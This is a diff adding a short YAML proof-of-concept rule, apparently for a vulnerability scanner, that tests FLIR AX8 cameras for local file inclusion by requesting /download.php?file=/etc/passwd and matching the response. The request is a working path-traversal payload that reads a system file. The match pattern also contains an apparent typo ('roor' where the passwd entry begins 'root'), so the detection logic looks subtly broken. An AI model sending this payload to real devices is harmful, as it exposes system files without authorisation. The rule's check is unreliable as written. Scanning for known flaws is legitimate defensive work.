@@ -1,0 +1,10 @@
+name: poc-yaml-flir-ax8-download-lfi
+rules:
+  - method: GET
+    path: /download.php?file=/etc/passwd
+    expression: |
+      response.status == 200 && "roor:[x*]:0:0:".bmatches(response.body)
+detail:
+  author: MaxSecurity(https://github.com/MaxSecurity)
+  links:
+    - https://blog.csdn.net/qq_37602797/article/details/116719896
